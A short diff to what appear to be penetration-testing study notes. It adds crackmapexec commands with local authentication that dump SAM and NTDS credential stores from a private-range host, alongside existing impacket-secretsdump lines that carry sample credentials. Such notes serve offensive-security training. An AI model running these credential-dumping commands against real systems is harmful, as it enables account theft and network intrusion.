@@ -286,6 +286,10 @@ a. Network Exploitation
 		crackmapexec smb 192.168.1.100 -u 'admin' -p 'password' --sam
 		crackmapexec smb 192.168.1.100 -u 'admin' -p 'password' --ntds
 
+		use local auth:
+		crackmapexec smb 192.168.214.147 -u 'dave2' -p 'password123!' --local-auth --sam
+		crackmapexec smb 192.168.214.147 -u 'dave2' -p 'password123!' --local-auth --ntds
+
 		Dump Even more credentials:
 		impacket-secretsdump domain/username:password@IPADDRESS
 		impacket-secretsdump medtech/joe:Flowers1@172.16.229.11 
